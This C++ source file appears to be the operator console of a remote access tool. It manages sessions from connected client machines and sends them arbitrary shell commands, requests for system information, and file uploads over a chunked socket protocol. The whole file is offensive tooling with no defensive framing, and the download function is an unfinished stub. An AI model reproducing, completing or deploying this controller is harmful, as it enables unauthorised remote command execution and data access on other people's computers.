#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <algorithm>
#include <cerrno>
#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <exception>
#include <fstream>
#include <functional>
#include <iomanip>
#include <ios>
#include <iostream>
#include <map>
#include <sstream> // istringstream
#include <string>
#include <utility>
#include <vector>

#include "completions.cpp"
#include "logging.h"
#include "stores.h"
#include "tabulator.h"

class Washroom
{
private:
  int m_currentSock = -1;
  std ::string m_currentIP = "WSR";
  std::string m_msg;

private:
  // Send data to the client using chunked transfer encoding
  void
  sendData (const std::string &data)
  {
    size_t chunkSize = 4096;
    size_t offset = 0;

    while (offset < data.size ())
      {
        size_t currentChunkSize = std::min (chunkSize, data.size () - offset);
        std::ostringstream header;
        header << std::hex << currentChunkSize << "\r\n";
        std::string chunk
            = header.str () + data.substr (offset, currentChunkSize) + "\r\n";
        if (send (m_currentSock, chunk.c_str (), chunk.size (), 0) == -1)
          {
            resetSession ();
            return;
          }
        offset += currentChunkSize;
      }

    // end of transmission
    if (send (m_currentSock, "0\r\n\r\n", 6, 0) == -1)
      {
        resetSession ();
      }
  }

  // reset the current session incase of an error
  void
  resetSession ()
  {
    if (m_currentSock == -1)
      {
        return;
      }
    stores::ClientManager::getInstance ().removeClient (m_currentSock);
    Logging::info ("{} disconnected!", m_currentIP);
    m_currentSock = -1;
    m_currentIP = "WSR";
  }

  // Receive data from the client using chunked transfer encoding
  void
  recvData ()
  {
    std::string buffer;
    std::string msg;
    char buff[1024];

    while (true)
      {
        int bytesReceived = recv (m_currentSock, buff, sizeof (buff), 0);
        if (bytesReceived == -1)
          {
            Logging::error ("recvData(): {}", strerror (errno));
            break;
          }
        else if (bytesReceived == 0) // EOF
          {
            resetSession ();
            break;
          }
        else
          {
            buffer.append (buff, bytesReceived);

            while (true)
              {
                size_t headerEnd = buffer.find ("\r\n");
                if (headerEnd == std::string::npos)
                  break;

                // Extract chunk size
                std::string chunkSizeHex = buffer.substr (0, headerEnd);
                size_t chunkSize = std::stoul (chunkSizeHex, nullptr, 16);

                if (chunkSize == 0)
                  {
                    // End of transmission
                    std::cout << "Received message: " << msg << "\n";
                    return;
                  }

                // Check if the chunk data and trailer are available
                if (buffer.size () < headerEnd + 2 + chunkSize + 2)
                  break;

                // Extract chunk data
                size_t chunkStart = headerEnd + 2;
                msg.append (buffer.substr (chunkStart, chunkSize));

                // Remove processed chunk from buffer
                buffer = buffer.substr (chunkStart + chunkSize + 2);
              }
          }
      }
  }

  // run a command in client-side
  void
  shellMode ()
  {
    if (m_currentSock == -1)
      {
        Logging::info ("No select session");
        return;
      }

    sendData ("shell");
    while (true)
      {
        // FIX: if a session here
        std::cout << ANSIColors::CYAN << "[shell@" << m_currentIP << "]# "
                  << ANSIColors::RESET;
        std::string command;
        std::getline (std::cin, command);
        if (command.empty ())
          {
            continue;
          }
        else if (command == "exit")
          {
            sendData (command);
            break;
          }
        else
          {
            sendData (command);
            recvData ();
          }
      }
  }

  void
  listSessions () const
  {
    auto sessions = stores::ClientManager::getInstance ().getClients ();
    if (sessions.empty ())
      {
        Logging::info ("No active sessions");
        return;
      }

    tabulator::Table table;
    table.setHeaders ({ "ID", "NAME", "IP Address", "PORT" });
    for (const auto &session : sessions)
      {
        std::string addr = inet_ntoa (session.addr.sin_addr);
        std::string port = std::to_string (ntohs (session.addr.sin_port));
        auto name = session.alias;
        auto id = std::to_string (session.id);
        table.addRow ({ id, name, addr, port });
      }
    table.sortColumn (1);
    table.display (tabulator::Table::Alignment::Center);
  }

  // alias a session
  void
  aliasASession (const std::vector<std::string> &details)
  {
    if (details.size () != 2)
      {
        Logging::info ("unable to parse the args");
        return;
      }

    try
      {
        size_t id = std::stoul (details[0]);
        stores::ClientManager::getInstance ().renameClient (id, details[1]);
      }
    catch (const std ::exception &e)
      {
        Logging::error ("unable to parse the args: {}", e.what ());
      }
  }

  void
  selectSession (const std::vector<std::string> &ids)
  {
    if (ids.size () != 1)
      {
        Logging::info ("invalid ID");
        return;
      }
    try
      {
        size_t id = std::stoul (ids[0]);
        auto session = stores::ClientManager::getInstance ().getClient (id);
        m_currentSock = session.sock;
        m_currentIP = inet_ntoa (session.addr.sin_addr);
      }
    catch (const std ::exception &e)
      {
        Logging::error ("invalid ID: {}", e.what ());
      }
  }

  // get session system info
  void
  systeminfo ()
  {
    if (m_currentSock == -1)
      {
        Logging::info ("No selected session");
        return;
      }

    sendData ("sysinfo");
    recvData ();
  }

  void
  downloadFile (const std::vector<std::string> &files)
  {
    if (m_currentSock == -1)
      {
        Logging::info ("No selected session");
        return;
      }

    std::istringstream metadataStream;
  }

  void
  uploadFile (const std::vector<std::string> &files)
  {
    if (m_currentSock == -1)
      {
        Logging::info ("No selected session");
        return;
      }

    std::ifstream file (files[0], std::ios::binary | std::ios::ate);
    if (!file.is_open ())
      {
        Logging::error ("{}: ", strerror (errno));
        return;
      }

    // get file size
    size_t fileSize = file.tellg ();
    file.seekg (0, std::ios::beg);

    // send file metadata
    std::ostringstream metadata;
    metadata << "UPLOAD " << files[0] << " " << fileSize << "\n";
    sendData (metadata.str ());

    // send file content
    char buffer[4096];
    while (!file.eof ())
      {
        file.read (buffer, sizeof (buffer));
        // size_t bytesRead = file.gcount ();
        sendData (buffer);
      }
    file.close ();
    Logging::info ("file uploaded successfully");
  }

  // parse a command and its args int pairs
  std::pair<std::string, std::vector<std::string> >
  parseCommands (const std::string &userInput)
  {
    std::istringstream iss (userInput);
    std::string command;
    std::vector<std::string> args;

    iss >> command; // extract first word
    std::string arg;
    while (iss >> std::quoted (arg))
      {
        args.push_back (arg);
      }
    return { command, args };
  }

  // full help
  void
  helpFull ()
  {

    std::cout << "list - list all available sessions\n"
                 "select ID - select a sessions wit ID\n"
                 "shell - executed commands on the client-side\n"
                 "dl FILE - download a FILE\n"
                 "up FILE - upload a FILE to the client\n"
                 "sysinfo - get client system info\n"
                 "help - get help\n"
                 "exit - quit :("
              << std::endl;
  }

public:
  Washroom () = default;

  // start in command mode
  void
  commandMode ()
  {
    // commands - string:function(args)
    std::map<std::string,
             std::function<void (const std::vector<std::string>)> >
        commands = {

          { "list",
            [this] (const std::vector<std::string> &) { listSessions (); } },
          { "select",
            [this] (const std::vector<std::string> &args) {
              selectSession (args);
            } },
          { "alias",
            [this] (const std::vector<std::string> &args) {
              aliasASession (args);
            } },
          { "shell",
            [this] (const std::vector<std::string> &) { shellMode (); } },
          { "dl",
            [this] (const std::vector<std::string> &args) {
              downloadFile (args);
            } },
          { "up",
            [this] (const std::vector<std::string> &args) {
              uploadFile (args);
            } },
          { "sysinfo",
            [this] (const std::vector<std::string> &) { systeminfo (); } },
          { "help",
            [this] (const std::vector<std::string> &) { helpFull (); } },

        };

    rl_attempted_completion_function = completions::CommandHandler::completion;
    while (true)
      {
        std::cout << ANSIColors::CYAN << "[" << m_currentIP << "]# "
                  << ANSIColors::RESET;
        char *userInput = readline ("");
        if (!userInput)
          break; // Ctrl-D to quit

        add_history (userInput);

        std::string userInput2 (userInput);
        std::free (userInput);

        auto [command, args] = parseCommands (userInput2);
        Logging::debug ("parseCommands(): command: {}, args:...", command);

        if (command == "exit")
          {
            if (m_currentSock != -1)
              {
                sendData ("exit");
              }
            break;
          }

        auto it = commands.find (command);
        if (it != commands.end ())
          {
            it->second (args);
          }
        else
          {
            std::cout << "available commands: list, select, shell,  dl, up, "
                         "sysinfo, help, exit"
                      << std::endl;
          }
      }
  }
};
